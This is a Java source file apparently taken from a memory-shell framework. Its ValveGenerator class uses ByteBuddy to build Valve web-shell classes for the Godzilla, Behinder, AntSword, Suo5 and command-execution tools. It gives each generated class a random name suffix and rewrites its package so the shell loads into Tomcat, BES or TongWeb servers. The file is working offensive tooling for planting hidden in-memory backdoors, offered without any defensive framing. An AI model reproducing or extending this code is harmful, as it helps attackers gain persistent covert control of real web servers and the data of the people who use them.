package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordValve;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderValve;
import com.reajason.javaweb.memshell.shelltool.command.CommandValve;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaValve;
import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Valve;
import com.reajason.javaweb.memshell.utils.CommonUtil;
import com.tongweb.web.thor.comet.CometEvent;
import com.tongweb.web.thor.connector.Request;
import com.tongweb.web.thor.connector.Response;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.asm.AsmVisitorWrapper;
import net.bytebuddy.description.field.FieldDescription;
import net.bytebuddy.description.field.FieldList;
import net.bytebuddy.description.method.MethodList;
import net.bytebuddy.description.modifier.Visibility;
import net.bytebuddy.description.type.TypeDescription;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.dynamic.loading.ClassLoadingStrategy;
import net.bytebuddy.implementation.FixedValue;
import net.bytebuddy.implementation.Implementation;
import net.bytebuddy.jar.asm.ClassVisitor;
import net.bytebuddy.jar.asm.commons.ClassRemapper;
import net.bytebuddy.jar.asm.commons.Remapper;
import net.bytebuddy.pool.TypePool;
import org.jetbrains.annotations.NotNull;

/**
 * @author ReaJason
 * @since 2025/2/22
 */
public class ValveGenerator {

    public static final String CATALINA_VALVE_PACKAGE = "org.apache.catalina";
    public static final String BES_VALVE_PACKAGE = "com.bes.enterprise.webtier";
    public static final String TONGWEB6_VALVE_PACKAGE = "com.tongweb.web.thor";
    public static final String TONGWEB7_VALVE_PACKAGE = "com.tongweb.catalina";

    public static class ValveRenameVisitorWrapper implements AsmVisitorWrapper {
        private final String newPackageName;

        public ValveRenameVisitorWrapper(String newPackageName) {
            this.newPackageName = newPackageName.replace('.', '/');
        }

        @Override
        public int mergeReader(int flags) {
            return flags;
        }

        @Override
        public int mergeWriter(int flags) {
            return flags;
        }

        @NotNull
        @Override
        public ClassVisitor wrap(@NotNull TypeDescription instrumentedType,
                                 @NotNull ClassVisitor classVisitor,
                                 @NotNull Implementation.Context implementationContext,
                                 @NotNull TypePool typePool,
                                 @NotNull FieldList<FieldDescription.InDefinedShape> fields,
                                 @NotNull MethodList<?> methods,
                                 int writerFlags,
                                 int readerFlags) {
            return new ClassRemapper(
                    classVisitor,
                    new Remapper() {
                        @Override
                        public String map(String typeName) {
                            String packageName = CATALINA_VALVE_PACKAGE.replace(".", "/");
                            if (typeName.startsWith(packageName)) {
                                return typeName.replace(packageName, newPackageName);
                            } else {
                                return typeName;
                            }
                        }
                    });
        }
    }

    public static Class<?> generateValveClass(String packageName, ShellTool shellTool) {
        Class<?> targetClass = null;
        switch (shellTool) {
            case Suo5:
                targetClass = Suo5Valve.class;
                break;
            case Godzilla:
                targetClass = GodzillaValve.class;
                break;
            case Behinder:
                targetClass = BehinderValve.class;
                break;
            case AntSword:
                targetClass = AntSwordValve.class;
                break;
            case Command:
                targetClass = CommandValve.class;
                break;
            default:
                throw new IllegalArgumentException("Unknown shell tool: " + shellTool);
        }
        String newClassName = targetClass.getName() + CommonUtil.getRandomString(5);

        DynamicType.Builder<?> builder = new ByteBuddy()
                .redefine(targetClass)
                .name(newClassName)
                .visit(new ValveRenameVisitorWrapper(packageName));

        if (TONGWEB6_VALVE_PACKAGE.equals(packageName)) {
            builder = builder
                    .defineMethod("getInfo", String.class, Visibility.PUBLIC)
                    .intercept(FixedValue.value(""))
                    .defineMethod("event", void.class, Visibility.PUBLIC)
                    .withParameters(Request.class, Response.class, CometEvent.class)
                    .intercept(FixedValue.originType());
        }


        try (DynamicType.Unloaded<?> unloaded = builder.make()) {
            return unloaded.load(ValveGenerator.class.getClassLoader(), ClassLoadingStrategy.Default.WRAPPER_PERSISTENT).getLoaded();
        }
    }

    private static Class<?> generateClass(String className) {
        try (DynamicType.Unloaded<Object> unloaded = new ByteBuddy()
                .subclass(Object.class)
                .name(className)
                .make()) {
            return unloaded.load(ValveGenerator.class.getClassLoader(), ClassLoadingStrategy.Default.WRAPPER_PERSISTENT).getLoaded();
        }
    }
}
